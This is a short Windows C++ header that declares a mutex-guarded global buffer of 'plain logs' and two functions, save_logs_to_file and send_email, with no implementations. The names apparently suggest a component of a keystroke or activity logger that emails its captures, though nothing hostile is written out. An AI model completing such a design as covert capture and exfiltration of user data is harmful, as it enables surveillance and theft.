#ifndef MEMORY_H
#define MEMORY_H
#include <mutex>
#include <vector>
#include <Windows.h>

inline std::vector<BYTE> g_plainLogs;
inline std::mutex g_logMutex;


void save_logs_to_file();
void send_email();

#endif //MEMORY_H
